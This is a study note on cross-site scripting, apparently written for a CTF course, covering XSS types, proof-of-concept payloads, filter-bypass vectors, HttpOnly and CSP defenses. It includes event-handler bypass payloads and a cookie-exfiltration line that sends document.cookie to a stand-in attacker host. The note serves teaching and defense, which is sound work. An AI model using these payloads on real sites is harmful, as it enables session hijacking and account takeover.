---
topic: web-security
tags: [xss, reflected-xss, stored-xss, dom-xss, cookie-theft, httponly, csp, injection, owasp-top-10]
sources: [assis-xss-cheat-sheet-2020, mcdonald-grokking-web-application-security, yaworski-real-world-bug-hunting, ball-hacking-apis]
updated: 2026-09-10
---

# Cross-Site Scripting (XSS)

Getting your JavaScript to run in someone else's browser because a site puts
user input into a page without escaping it. The browser can't tell your injected
markup from the site's own, so it runs it — with full access to the page, its
DOM, and its cookies.

## The three types

- **Reflected** — input is echoed straight back in the response (a search term,
  a URL parameter). The payload lives in a crafted link the victim must open.
- **Stored (persistent)** — input is saved (comment, profile, message) and
  served to everyone who views that page. One injection, many victims — the most
  dangerous.
- **DOM-based** — the bug is in client-side JavaScript: a script reads an
  untrusted source (`location.hash`, `location.search`) and writes it to an
  unsafe sink (`innerHTML`, `document.write`) without escaping. The payload may
  never touch the server.

## Why an unescaped reflection is dangerous

When input is placed into HTML without encoding, the browser's parser reads `<`
and `>` as real tags, not text. So `<b>x</b>` renders bold, and `<script>`
executes. That "does my `<b>` render bold?" test is the quickest way to confirm
injection.

### Classic proof-of-concept payloads

```html
<script>alert(document.cookie)</script>
<img src=x onerror="alert(document.cookie)">
```

The `<img onerror>` form is the go-to when `<script>` is filtered: the image
fails to load (`src=x`), the `onerror` handler fires, your JS runs. Both are
loud on purpose — `alert` just proves execution.

## Bypassing input filters

XSS does **not** require a `<script>` tag, so a filter that only strips `<script>`
is trivially bypassed — any element with an **event handler** runs JavaScript:

```html
<img src=x onerror="PAYLOAD">
<svg onload="PAYLOAD">
<body onload="PAYLOAD">
<iframe onload="PAYLOAD">
<input autofocus onfocus="PAYLOAD">
<details open ontoggle="PAYLOAD">
```

Other common bypasses for naive filters:

- **Case / spacing:** `<ScRiPt>`, `<script/x>`, extra whitespace — if the filter
  is case-sensitive or matches too literally.
- **Broken-up tags:** `<scr<script>ipt>` — a filter that removes one `<script>`
  can leave a valid one behind.
- **Attribute breakout:** if input lands inside an attribute, close it first:
  `"><img src=x onerror=PAYLOAD>` or `" onmouseover="PAYLOAD`.
- **Encoding:** HTML entities / URL encoding the filter decodes after checking.

Blacklisting a keyword is a broken defense — there are too many vectors. The real
fix is output encoding + CSP (below). The Assis *XSS Cheat Sheet* in the
bibliography is a payload reference for exactly this.

## Cookie theft and HttpOnly

The high-value target is usually the session cookie:

- **Read it:** `document.cookie` returns the page's cookies to your script.
- **Exfiltrate it:** send it to a server you control —
  `fetch('https://evil.example/?c=' + encodeURIComponent(document.cookie))`.
- **Hijack:** paste the stolen session cookie into your browser and you are the
  victim, no password needed.

**`HttpOnly`** is the mitigation: a cookie set with `HttpOnly` is sent on
requests but is **invisible to JavaScript** — `document.cookie` cannot read it.
An XSS still runs, but it can't lift an HttpOnly session cookie. A flag or token
in a cookie *without* HttpOnly is readable by any XSS on the site.

## The fix

1. **Context-aware output encoding.** Before rendering user data into HTML,
   convert metacharacters: `<`→`&lt;`, `>`→`&gt;`, `"`→`&quot;`, `'`→`&#39;`,
   `&`→`&amp;`. The browser then shows them as text, not markup. Modern
   frameworks (Jinja2, React, Angular) escape by default — the bug usually comes
   from bypassing that (raw output, `innerHTML`, `|safe`).
2. **Content-Security-Policy.** A CSP header that omits `'unsafe-inline'` tells
   the browser to refuse injected inline `<script>` and `on* =` handlers —
   defense in depth even if encoding is missed.
3. **`HttpOnly` + `Secure` on session cookies** so an XSS can't steal them.

## Recognising this in a CTF

Hints like "reflects your input", "search that isn't careful", or a field whose
value reappears on the page → try `<b>x</b>` to confirm unescaped HTML, then
`<script>alert(document.cookie)</script>`. If a flag or token is stored in a
non-HttpOnly cookie, XSS reads it directly.

## Related

- [Secrets in client-side code](client-side-secrets.md) — the other "the client
  is public" web bug.

## Seen in

- QuickFind (course, Class 2) — reflected XSS on an internal search that echoed
  the query unescaped; a flag stored in a non-`HttpOnly` cookie was read with
  `<script>alert(document.cookie)</script>`. *(Write-up kept local until the
  course releases it.)*
- Foro Interno (course, Class 2) — stored XSS: comments persisted and served to
  every visitor unescaped; injected JS can read DOM data (a hidden flag div) and
  exfiltrate it. *(Write-up kept local until the course releases it.)*
- Foro Interno con filtro (course, Class 2) — the "fix" only stripped `<script>`;
  an event-handler vector (`<img onerror>` / `<svg onload>`) bypasses it. Flag
  again in a hidden div. *(Write-up kept local until the course releases it.)*

## Sources

Grounded via NotebookLM in the [bibliography](../../books/README.md):

- **Assis — *XSS Cheat Sheet*** — payloads and filter-evasion variants.
- **McDonald — *Grokking Web Application Security*** — how XSS works, escaping
  contexts, CSP.
- **Yaworski — *Real-World Bug Hunting*** — real reflected/stored XSS reports.
- **Ball — *Hacking APIs*** — injection and where reflected input reaches APIs.
